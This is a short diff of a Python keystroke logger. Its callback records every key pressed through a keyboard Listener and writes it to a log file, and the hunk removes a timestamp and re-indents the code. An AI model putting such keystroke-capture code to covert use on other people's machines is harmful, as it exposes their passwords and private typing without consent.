@@ -33,15 +33,12 @@ logging.basicConfig(filename=f"{logging_dir}/{nomfile}", level=logging.DEBUG, fo
 
 
 def on_press(key):
-    print(key)
-    myDatetime = datetime.datetime.now()
-    print(myDatetime)
-    logging.info(key)
+	print(key)
+	logging.info(key)
 
 with Listener(on_press=on_press) as lis:
     lis.join()
-    
-    
+   
     
 
 	  
